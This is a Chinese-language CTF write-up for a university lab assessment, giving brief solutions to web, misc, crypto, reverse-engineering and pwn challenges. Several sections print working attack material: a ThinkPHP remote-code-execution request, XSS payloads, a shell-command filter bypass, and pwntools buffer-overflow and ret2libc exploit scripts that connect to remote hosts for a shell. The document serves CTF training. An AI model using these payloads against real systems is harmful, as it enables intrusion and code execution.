---
title: 实验室考核题目wp
date: 2022-11-27 22:36:39
password: aygxy513@
wrong_pass_message: 密码不对，找我要密码
theme: xray
---



实验室考核题目wp

<!--more-->

前言

# Web

## Web签到

> 签到题

- 考察看源码的方法，在这里禁用了F12和右键

右键被禁用了，ctrl+u看源码得到flag

## GET&&POST 					

> 你知道GET和POST吗？

- 考察get和post传参

先get，然后post，就出来flag了

## upload	

> 相信我，按照我说的上传你就能得到你想要的东西

- 考察上传规则

看源码得到上传规则，随便上传一个图片，提示需要上传give_me_flag.php，那就改成这个名字上传即可得到flag

## 你能赢吗？

> TWO-ZERO-FOUR-EIGHT

- 考察js文件敏感信息泄露

看源码分析js文件得到flag

## 🕷来了 					

> 这么大的蜘蛛,不知道味道如何

- 考察robots文件泄露敏感信息，题目就是提示了

访问robots.txt得到surprise.php是不允许爬虫得到的

继续访问surprise.php，会发现当访问的时候会302重定向，所以我们可以使用bp拦截，从而得到flag

## 火箭头 					

抓包看header

## upload2 					

> 你还能上传吗？

- 考察文件上传前端检查的绕过

还是先上传give_me_flag.php，然后发现只能上传固定格式的文件，抓包修改绕过前端过滤，得到flag

## XFF&&UA

> XFF和UA被坏人抓走了，你能顺利渡过难关解救他们吗？只有他们有你想要的东西哦

- 考察XFF头伪造本地ip以及UA头的本质

先XFF伪造ip，然后改UA头伪造本地，得到flag

## 놓다 					

> 除了GET，POST，还有哪些请求方式呢？

- 考察put传参，旨在让大家知道除了get，post之外还有其他传参方式

bp抓包改传参方式，传message就行

## dGhpbmtwaHA=

> php最常见的框架，你不会不知道吧

- 考察以往的框架漏洞

网上随手找，都是exp

```
POST /index.php?s=captcha HTTP/1.1
Host: 43.138.40.212:5003
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 92

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
```

## login 					

绕过成功过登录即是flag

md5相等但是又不能相等可以数组绕过

```
username[]=1&password[]=2
```

## easyphp 		

> 一个简单的php			

- 考察php代码审计及绕过姿势

分析代码之后payload如下

```
?513=flag&flag=513
```

## play game

> Try u best! You can't win me!

- 考察伪造本地ip的姿势，并加深get和post的使用

先根据要求get，post传参，然后加XFF头即可得到flag

## 是神魔阻挡了我 					

> 是天空，是大海，不，是我最爱的饼干

- 考察cookie的用法，前端限制写入，

先是cookie中user的值改成1，发现html长度限制，f12看源码得到需要上传的是name=xxxx，但是前端不能写入，可以看到传参方式是post，下面有提示woai513，所以不难想到是传post内容为name=woai513，然后需要管理员身份，也就是改cookie值0-->1，即可得到flag

## 反序列化

其实就是看大家是否了解php反序列化，难度不高

```
<?php
class baby
{
    public $filename="flag.php" ;
}
$b=new baby();

var_dump(serialize($b));
// str=O:4:"baby":2:{s:8:"filename";S:8:"\x66lag.\x70\x68\x70";}

```

只需要绕过php和flag字符即可，绕过思路很多，比如十六进制绕过

## 实战渗透

就是上传shell即可，没有任何过滤

## itss

基础ssti，就是让大家了解一下，没有任何过滤，看一下配置文件就出来flag了

## snake

就一个game.js，需要审计一下主要功能，前半部分基本是实现贪吃蛇这个游戏的功能，后半部分就是关于score已经失败之后返回什么等等，看到后半部分你就会看到有个路径，为了降低难度，路径就已经给提示了，getscore.php，访问一下就可以看到貌似是成绩，{"state":200,"msg":"ok","score":1}，状态码200返回是正常，score为1

剩下的还有一个难点，如果你玩一下这个游戏你也可以发现，长时间吃不到豆子，就会报出来，长时间之后又没到报吃不到的那个信息之前，会报这么长时间没吃到啥啥的，总之时间短不行时间长也不行，没错，这里加了时间控制，getscore.php这个页面的确就是可以getscore，但是时间把控要到位，不能慢不能快，基本三四秒点一次，点五十次，就可以到达50分，得到flag

## cha

> 没错，cha他

过滤了一些东西，黑盒测试，插就完了，网上找绕过方法，而且也有现成得payload

列举一个

```
<a href=javascript:alert(document.domain)>M</a>
<a href=javascript:alert('xss')>123</a>
```

目标就是让其弹窗，捕捉网页弹窗，然后在控制台中输出base64，解码就是flag

> ps：唯一想不到得可能就是flag是在控制台返回

# Misc

## 签到

> 我们的团队在我们的机器上存储了一个标志，但是，我们被安工的513实验室黑了，他们生成了 2999 个标志并将我们的原始标志隐藏在 .txt 文件中。该标志由 5 个大写字母后面紧跟5 个数字，然后后面紧跟 6 个大写字母组成。你能帮我们找到吗？

- 考察对重要信息的检索，就是眼力，还有耐心

查看flag组成，直接https://regexr.com/在线正则匹配搜索

## the great directory

- 考察通过线索来找flag

打开题目解压附件之后发现有很多文件，并不知道哪一个包含了真正的flag

所以查看文件的属性，比较字节的大小，包含flag的文件要大，最后找到了真正的file.txt

## 一道简单的图片隐写

> Do you want to get the flag？Try to look at the picture carefullty!

- 图片隐写

直接用010打开，最后会有一段base64编码，解码之后就是flag

## 你虚伪吗

> 眼见不一定为实

- 对文件类型的认知以及代码审计能力

附件改后缀为zip，解压之后代码审计

## 扫 ?它？ 					

> 扫就完了

看文件格式，知道是png，打开时二维码，扫码得到flag

## dumplings&bank

- 关键线索的检索

车尾  "琼"是海南的简称     地图上搜索东北饺子城，饺子城对面就是银行，查一下该银行的网址就能得到flag

## 啊哒啊哒

- 文件类型的认知，关键信息的检索，进制转化

附件解压之后得到一张图片，把后缀改为zip接着解压（解压密码就在图片里面，但是需要用到16进制在线转字符的工具），最终得到flag

## 爱你所以环环相扣

> 小姐姐真好看，好好欣赏，0n 1iN 3！！

- 环环相扣

附件解压，继续解压haokan.zip，解压密码就是图片的名称（不要带png），解压之后图片里面有一段base64加密，解密之后就是flag

列举个能进行加密解密的网站

http://www.jsons.cn/imghideinfo/

## 就这？就这？ 					

> 就这？就这？不会吧？

几次解压之后得到如下内容

```
就这?就这? 不会吧?就这?就这?就这? 不会吧?就这?就这?就这? 不会吧?就这?就这?就这? 不会吧?不会吧? 不会吧?不会吧?就这? 就这?就这?不会吧?不会吧? 不会吧?不会吧?不会吧?不会吧? 不会吧? 不会吧?不会吧?不会吧? 不会吧?不会吧?不会吧?不会吧? 不会吧?不会吧?就这? 不会吧?不会吧? 不会吧?就这?就这?不会吧? 不会吧?不会吧? 就这?不会吧? 就这?就这?不会吧?
```

就这? 改成 - ,不会吧 改成 .，得到AGCTF%u7bMJJJIUZHESHUIPING%u7d

所以flag为AGCTF{MJJJIUZHESHUIPING}

## 彩蛋 					

> 小彩蛋，送你的？？

就是送的，你只要解出了里面说的题目，就能得到这题flag

## 呯~~~!!! 			

> 出题人说实验室官网的ip就是flag，不知道你能不能找到实验室官网呢
>  AGCTF{ip}

找到实验室官网地址，ping一下就是ip，即是flag

## 罕见base 					

> flag形式:flag{xxxxxxxxxx}

jpg图片隐写，用Jphswin解出密文flag，然后base58解出flag

## wsywsywsywsy

> wsywsywsywsy    wsywsywsywsy
>
> wsywsywsywsy    wsywsywsywsy

加进去的错误数据删掉即可，题目和描述已经给了提示，打开也可以看到有好多wsywsywsywsy，不难想到

## 你是lsb吗？ 					

使用stegsolve改通道，lsb得到flag

# Crypto

## 爱国敬业好青年

直接将题目后面的社会主义核心价值观，放到网站核心价值观解码

## easy encode

依次进行莫斯解码，base16，unicode，url，base64最后得到。

## 猴哥，二师兄来了

下载附件加后缀.rar,解压出一张图片，猪圈密码解密

## Math&English

算出结果，元音解密即可

## O泡

一直BubbleBabble解密即可。

## 你懂音乐吗？

音乐符号解密即可

## HEXXXXXXXXXXXXXXXXX

十六进制转字符串

## 二师兄，师傅来了

佛曰解密：https://ctf.bugku.com/tool/todousharp

## 这是一段新闻

隐藏字符解密----->核心价值观解密

## 控制台

jother加密，f12打开控制台，使用console命令；
console.log(xxx)回车即可，xxx为密文

## French Ciper

维吉尼亚解密，密钥是ayit

## 倒了倒了

选择一个在线在线逆序输出的网站，逆序输出字符串

## taowa？？？ 					

第一种方法就是手动解压

第二种就是写个脚本解压，放个脚本吧，如下

```
import zipfile
import os
for i in reversed(range(0,5000)):
    print(i)
    zipFile = zipfile.ZipFile('flag'+str(i)+'.zip')
    for file in zipFile.namelist():
        zipFile.extract(file, '.')
    zipFile.close()
    os.remove('flag'+str(i)+'.zip')
```

## 模糊 					

> Á̵̡̨̨̡̛̻̖̺̞͔̺̱̤̼̜̝̭̮̥͍̬̱̳̤͙̓̉̅̈́͗̆̊̍͂̄́́̒͗͗͠ͅͅG̶̜̦͉̖̉͋̇̅̀̇̀̐̈́̈́͋̃̆̈́͑̈̃͋̾̎̂̒̀̏͊͘̚͝C̷̨̨͚̺̠͙͇̰̻͈̫̮͔͎̏̒͂̐́̍͆̌̈͛̽̏Ţ̸̢̨̛͖̹̣̠̜̬̪͙̭̈̈̌̊̊̈̈́̆̋͗̈́̚͜͜͝ͅF̸̨̡̢̢̨̡̛̛̠̘͙̭͓̣̻̗͕̟̻̼̮͍̺̱̰̜͔͎̖̣͉̫̯̳̭̙̪͎̺̤̍͗͋͋̀̐͌̾͗̋̃̍͗͗̌͊͋́̒͒̔̿̓͑̓̕͜͝͝͝{̴̢̡̢̢̛̛̬̫̗̼͔͔̖̼̯͈̣̦̱̥̮̘̥̖͙̖̰͎̬̘̖̼̩̺̖̯̫̥͉̥̑̐͂̓͐̏̓͂̎̿̓̇̅̆̆͆̈́͝s̶̢̧̡̠̦̗̹͙̘̰̝̮͕͖̠̺̮̮͔̙̠̪͎̝̤̺̮͇̺̣̞̺̬͖̗̦͙̬̜̣̻̘͉͖̪̰͇̐̃͌̓͆̀͑̈́̈́̈́̌̅̾̔͗̐̒̂̀́̈́͠͝3̷̪̪̼͕̳͇͇̰͇̞͍̠̥̊ç̴̡̨̧̡̛̥̙͇͍̼͓̗̘̗̹͈͔̘͕̹̯͖͖͙̺̈́͂̐̀̾͆̔̆̆̒͐̓͌̀́͐̐͊̅̉́́̑͛͑̋̄͌͊͂̑̂̑͆̃̂̏̿̕̕̚͘͘͜͝͝͝ͅų̴̨̛̝̲̤̦̙̙͇͂͂̈́̉͂̀̇̒̍͒͆̏͗͒͊̈́̃̏̅͛̔͗̒͘̚͜͝͠͝ŗ̸̢̢̺͍̞͕̮͓̫͙̺͙̗̖̻̙̹͓͉̼̖͇̫͚̞͔̦̺̝̪͉̯̳͖̾̂̈̆͊͆̉̏̃͜ͅͅ1̴̡̢͚͚͖̻͕͚̺͔͇̤͔̬̥̖̩̰͍̪̪͎̦̪͓̼̦̭͉̞̱̭̰̤̟̥̗̻̠̩͈̲̩̫͙͉͙̬̟̆́̚͘͜͠͝t̴̢̧̡̼͈̯̹̠͇̖̻̩͓̥̰̳̼͙̭̞̟̪͍̭̎̏̋͜͠y̴̱̏̎̅̏̊͊̅͋͐̒̽̈́̓̓̿͑̕̚_̶̢̢̢̢̞͍̘̙̫̠̮̟̮̥̤̠͇̱̞͚̬͚̭̗̞̱̹̺̘̞͉̹̱͇̹͓̲̬̥̤̿́̇̈́̾͌́͊͊͛̐͗͂͒́͐͘̕͝ͅṯ̴̨̧̧̧̛͚̦̤͎̜̟̰̭̪̤͚͙̟͕̘̙̿͗̅̐̀̓̾͊͒̈̿̔̃̑̑͆͊̇̈́̆̂̀͊̾̎̑͆̓̈́͐̌́̉́̊̽͋̀͂̌̋́͘̕̕̕̕͠ͅͅͅh̸̨̢̨̧̡͚͕̪̘̹̟̦̰̙̮͙̖̝̥̲̙̼̼͖̹̺͍̮̞͉̱̫̥͈̟̭̘͎̘͍̐͗̈̔̃̈́̄̔̏̐̿̋̒̌̀̆̅̽̽̑͗͗̚̚͝͠ŗ̴̢̛͚̼̙̭̠͔̣̩̙͈̩̠̥̺̳͈̮̥̟̥̗̼̖͓̼̺̝̝̩̞͉͙̾͋͊̀̈́̈́̀̓͌̀́͊̽̕͘͠0̵̢̨̧̢̦̩̤̜̬̼̖̤̺̟̠̘̲̲̮͍̳̙̼̤̝͉̦͉̖̰̣͇̜̩̬͇͎̳̦̎̄̋̎̎̿̀̓̆́̊͐̈͂̚͜͜ͅͅͅư̶̛̭̖͒̽̓̈̒̏̒̒̅͝g̷̛̛͓͈͓̥̠̬̪͒̐͋̓͑͆̋͑̐̊̄̋̔̋̾́͂̓̑̇́̉͊̽͋̈́̓̽͗́̀͆͒̆̾̍̚͘͝͝͝ḫ̷͙̑̏͒̈́̾̚_̸̧̡̨̛̝͈̞̩̖̗̯̹̞̱͕͚̟̫͉̠̗̖͔̳̥̣̝̬̜̼͙̪̱̐̓́̽͛̂̒̏͐͗̿̈́̽̾̒̅̆̿̃̅̓́͋͐͋̋͐̐̋͊͊̀̉͋͛̉́̆̎̅͛̄̃̄̚͘̚͜͠ͅ0̴̡̡̛̰̯͚̪̭̗̮͎̖̞̤̙̩̥̼̭̯̬̈́̔̒̄͑̿͒̊̎̑͑͋̓̆̆͐̉̓͒̌̎͆͂̚̚͠͝͠͠ͅb̸͍̌͋͌̂̓́͐̋̄̾̍̀̾͆̽̓̈́͊̅̄͐̉͊̇͐̎̓̔̐͘̚s̴̡̧̢̛̛̘͇̹̫͓̞̠̞̝̝̱͉͎̙͖̯̻͖̩̉͊̃͂̎̓͂̉́̎̏̋̍̀̓̐́̌̀̈́́͗̑͆͂̒͐̈̃̂͛̿͋̈͆̔̈͋̾̿̾͘͘͘͜͝c̴̡̢̧̛̱̰̟͔̼͕͉͔͕̬͕͚̜̞͈͕̩̟̲̖͒̂́̂̄̄͗̓̎́̏͘̚͜ͅu̶̧̡̜͍̤͉̘͋̀͗̓̒̔̓͒̃͑͗̍͛̐̈́̀͘̕ŗ̷̡̛̛̤̺͈̯̰̱͓̳̣̙̠̠̺̓͋̋̓̕̚1̸̨̨̛̛̣̺̱̳̫̳͖̱͈̬̰̘̞͓͔̬͕̘͓̄́͒̂̽̇̍̓͐̈́̾͐͑́̓̾̓̐̃̍̌͊͗̆̅͛̎̾́̅̂̔̋̅̉̄̇̇͆̇̆͘̚͘͜͝͝1̵̢̧̨̨̡̖̱͓͍͖̲̩̼̞͙̝̫̣͙̬̠͙̝̼̲͙̣̺̫͔̳̝̩̱̩͚͈̫̳̗̜͇̼͎̞̠̒̀̽̅͗̉͛͑̈́͒̀̎͋̉͊̂̓̎̏̿̍͌͌͗̋̎̃̄͜͝͝ţ̴͙̯̬̺͋̇́̐̔͑̈́̽̾̀̓͒̂͂̒́͗̀͑̀̚̚͘̚͝͝ý̶̧̛̛̛̥̳̓͆͂̽̏͆̍͆͐̂̎͂́͊̌̓̊̾̍́̅̓̿̈́̿͗̽̾̿͗̐̔́͐̓̒̕̕̕͘̕͘͝͝͠͝}̵̨̧̡̡̡̛͓̫̖̫̗͚͕͇̞͙̫̩̙͖̲̤̟͇͙͎̩̱͉̣̩̬̥̤͍̮̪͚̮̝̤̟̩̓̉̀̾̓̐͒̀̿̈́̈́͊̆͗́̿̑͗̽͌̃̉͒̈͌̀͒̒͌͑̓̾́̓̓̕͠͠͝ͅ

[Glitch Text Generator (copy and paste) ― LingoJam](https://lingojam.com/GlitchTextGenerator)

毛刺修复即可

(ps：居然可以直接硬生生看出来，可以可以，看来还是毛刺加的不深)



# Reverse

## RE签到 

放进ida

shift+f12就能看到答案

## EZxor

ida32位打开

给了个假flag

sub_4113B1处理98这个数，跟进计算得到为24

再进行一个简单的异或

脚本如下：

```
b=[89,95,91,76,94,99,97,40,109,71,88,106,125,71,60,119,71,107,117,88,106,108,52,125,118,114,40,97,71,97,119,109,106,107,125,41,126,101]
flag=''
for i in range(len(b)):
        flag+=chr(24^b[i])
print(flag)
# AGCTF{y0u_@re_$o_sm@rt,enj0y_yourse1f}
```



## babyupx

查壳

![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272100789.png?x-oss-process=hzy)

可以看到由upx壳，故先脱壳再用 ida64 打开

脱壳

![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272100254.png?x-oss-process=hzy)

ida64打开

F5跟进主函数可看到
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272100928.png?x-oss-process=hzy)
简单分析后得到关键算法
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272100827.png?x-oss-process=hzy)
跟进woai513()得
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272100980.png?x-oss-process=hzy)
其对a1进行两两交换

编写脚本

```python
a = [158, 146, 184, 150, 230, 156, 152, 204, 184, 234, 220, 160, 192, 206, 190, 211, 207, 225, 219, 196, 249, 196, 184,
     205, 229, 209, 189, 218, 161, 195, 234, 211]
for i in range(0, len(a), 2):  # 对a进行两两互换位置对应函数woai513
    b = a[i]
    a[i] = a[i + 1]
    a[i + 1] = b
c = 'AGCTF{shei_jiao_shei_shi_bendan}'
for i in range(len(c)):
    a[i] -= ord(c[i])^8
    a[i] ^= 8
    print(chr(a[i]),end='')
```

运行后获得flag：

![](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272100839.png?x-oss-process=hzy)
flag：AGCTF{Y0u_Are_dong_reve_rse__0e}

## maze

附件为pyc文件，直接反编译

得到：

```python
crack = '&00*********0*********0*********00000*********0*******000**$****0*********0*0000****000**0********$0'

def run(s, list1):
    l = input()
    flag = 0
    for i in l:
        if i == 'd' and list1[s + 1] == '0':
            s += 1
            continue
        if i == 'a' and list1[s - 1] == '0':
            s -= 1
            continue
        if i == 's' and list1[s + 10] == '0':
            s += 10
            continue
        if i == 'w' and list1[s - 10] == '0':
            s -= 10
            continue
        if i == 'a' and list1[s - 1] == '$':
            flag = 1
            continue
        flag = 2
    if flag == 0:
        print('oh wrong')
    elif len(l) != 25:
        print('wrong format1')
    elif flag == 1:
        print('you solved, flag is AGCTF{your input}')
    else:
        print('wrong format2')

if __name__ == '__main__':
    crack_list = list(crack)
    s = crack_list.index('&')
    run(s, crack_list)
```

迷宫题，分析为10*10

左上为起点，下面为终点

ddsssddddssaasssddwdddssa

所以flag为

AGCTF{ddsssddddssaasssddwdddssa}

## 动态调试

查壳

![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272101925.png?x-oss-process=hzy)
无壳 可用ida32 打开

ida打开查看代码

![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272101077.png?x-oss-process=hzy)
ida打开后发现大量运算故从判断句开始，倒着分析
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272101004.png?x-oss-process=hzy)
分析后发现该程序判断数字为生成随机数且不经过任何处理
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272101974.png?x-oss-process=hzy)
故尝试使用od动态调试

动调

找到main函数
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272101919.png?x-oss-process=hzy)
结合ida发现判断句并不复杂且运算后直接输出flag故尝试将判断句nop掉
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272101963.png?x-oss-process=hzy)
对应判断句
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272101712.png?x-oss-process=hzy)
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272101733.png?x-oss-process=hzy)
对应wrong跳转
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272101765.png?x-oss-process=hzy)
运行后得flag
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272101754.png?x-oss-process=hzy)
flag：AGCTF{give_you_the_flag}

## EZre

ida32位打开附件

题目和这两个数据有关系

dword_41A038

dword_41A0B8

跟进提取数据

选中然后 shift+e 提取数据

再捋清数据之间的关系

脚本如下：

```python
a = [54, 20, 48, 26, 13, 86, 55, 121, 3, 102, 48, 72, 18, 3, 41, 103, 94, 35, 122, 43, 68, 85, 28, 71, 85, 36, 120, 32,
     70, 106, 28, 122]
b = [41, 62, 49, 77, 29, 48, 22, 18, 35, 42, 10, 38, 39, 32, 51, 11, 13, 26, 25, 41, 6, 21, 40, 9, 46, 44, 28, 35, 28,
     33, 28, 45]
c = [41, 62, 49, 77, 29, 48, 22, 18, 35, 42, 10, 38, 39, 32, 51, 11, 13, 26, 25, 41, 6, 21, 40, 9, 46, 44, 28, 35, 28,
     33, 28, 45]

d = 31
for i in range(32):
    c[i] += 1
for i in range(32):
    a[d] ^= c[i]
    d -= 1
for i in range(32):
    print(chr(a[i] + b[i]), end='')
```

flag为：AGCTF{0h,y0u_9et_1t,is_lt_ea$y?}

## EZexe

查壳

![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272102542.png?x-oss-process=hzy)
无壳直接用ida64打开
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272102464.png?x-oss-process=hzy)
根据其exe图标以及字符py推测为py文件，故可尝试将exe转为pyc再进行pyc反编译

exe转pyc（使用工具 pyinstxtractor）

> python3 pyinstxtractor.py EZexe.exe

![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272102504.png?x-oss-process=hzy)
得到含有pyc的文件
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272102509.png?x-oss-process=hzy)

![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272102383.png?x-oss-process=hzy)

pyc反编译

![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272102418.png?x-oss-process=hzy)
uncompyle6显示为python 3.9 版本故使用在线反编译网站

>https://tool.lu/pyc/

得到反编译代码
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272102045.png?x-oss-process=hzy)
简单分析后看到关键算法
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272102094.png?x-oss-process=hzy)
先进性base64加密然后进行简单异或得到flag

编写脚本

```python
import base64
a=[81, 84, 102, 71, 82, 64, 92, 48, 91, 90, 72, 121, 110, 103, 76, 60, 89, 89, 126, 101, 112, 70, 84, 36, 66, 77, 95, 99, 85, 90, 84, 115, 105, 100, 96, 74, 70, 98, 115, 64, 76, 109, 107, 76, 118, 106, 22, 72, 84, 114, 124, 91, 80, 118, 112, 14]
flag=''
for i in range(len(a)):
  a[i]^=i
  flag+=chr(a[i])
print(base64.b64decode(flag))
```

运行后获得flag
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272102131.png?x-oss-process=hzy)
flag：AGCTF{I kn0w you we11 be @ble t0 do t#at!}

## 未知的值

查壳

![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272103441.png?x-oss-process=hzy)
无壳直接用ida32 打开

ida查看伪代码

![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272103638.png?x-oss-process=hzy)
发现对数据进行大量处理故从判断句开始到着进行分析
分析后发现程序调用随机数参与运算
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272103602.png?x-oss-process=hzy)
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272103422.png?x-oss-process=hzy)
初步判断尝试使用爆破脚本

编写脚本

```python
a = [1033, 1034, 1035, 1036, 1037, 1278, 1060, 1096, 1037, 1070, 1037, 1033, 1043, 1078, 1026, 1104, 1059, 1049, 1029,
     1062, 1047, 1031, 1029, 1060, 1030, 1030, 1054, 1052, 1071, 1119, 1092, 1054, 1029, 1140, 1130, 1150, 1245]
b = 'AGCTF{This_is_the_last_challenges_re}'
c = [0 for i in range(len(a))]
for i in range(len(a)):
    a[i] -= 513
for i in range(1000):
    for j in range(len(a)):
        c[j] = ((ord(b[j]) + i) ^ j) ^ a[j]
    if c[0] == ord('A'):
        for i in range(len(a)):
            print(chr(c[i]),end='')

```

运行得flag
![在这里插入图片描述](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211272103549.png?x-oss-process=hzy)
flag：AGCTF{y0u_are_s0_nb_you_must_52o_513}



# PWN

## nc

nc然后ls，cat就出了

## 还能nc吗？

和上一题不一样的地方是就在于这个system函数，nc连上之后是不能直接cat flag.txt的，因为在这函数里空格会被转义，因此无法被识别，最直接得办法可以使用 cat${IFS}/flag.txt，再或者就是nc连接后直接输入/bin/sh或sh就可以直接getshell，之后cat /flag.txt 获得flag

## overflow

```
from pwn import *
#p=process('./a')
p=remote('81.69.247.186',8809)
payload = b'a'*18+p64(0x4006CE)
p.sendline(payload)
p.interactive()
```

## Math

i==15时，可以读入一个int，作为长度，传入gift

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209051244533.jpg?x-oss-process=hzy)

gift可以泄露canary，程序基址和libc基址

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209051244553.jpg?x-oss-process=hzy)

然后就是ret2libc

```
# -*- coding:utf-8 -*-
from pwn import *
context(log_level="debug")

#io=process("./BasicMath")
io=remote("81.69.247.186",8803)
elf=ELF("./chall")
libc=ELF("./libc-2.27.so")

#io_base=io.libs()[io.cwd+io.argv[0].strip(b".").decode()]
#offset=0x1685
#gdb.attach(io,"b * "+hex(io_base+offset))
#pause()

for i in range(15):
	io.recvuntil(b"] ")
	num1=int(io.recvuntil(b" +")[:-2],10)
	num2=int(io.recvuntil(b" =")[:-2],10)
	res=num1+num2
	io.sendlineafter(b"? ",str(res))

io.sendlineafter(b"= ? ",str(0x0000000100000050))

canary=u64(io.recv(8))
print("canary=="+hex(canary))

rbp=u64(io.recv(8))
print("rbp=="+hex(rbp))

main_addr=u64(io.recv(8))-323
proc_base=main_addr-elf.sym["main"]
print("proc_base=="+hex(proc_base))

io.recv(40)

__libc_start_main=u64(io.recv(8))-231
libc_base=__libc_start_main-libc.sym["__libc_start_main"]
print("libc_base=="+hex(libc_base))

pop_rdi=proc_base+0x1713
ret=proc_base+0x101a
system=libc_base+libc.sym["system"]
binsh=libc_base+libc.search(b"/bin/sh\x00").__next__()

payload=p64(canary)
payload+=p64(rbp)
payload+=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(ret)
payload+=p64(system)

io.sendline(payload)

io.interactive()

```

## 商店购物

溢出，正数十二位或者负数大于一万

##  stack

暂无wp
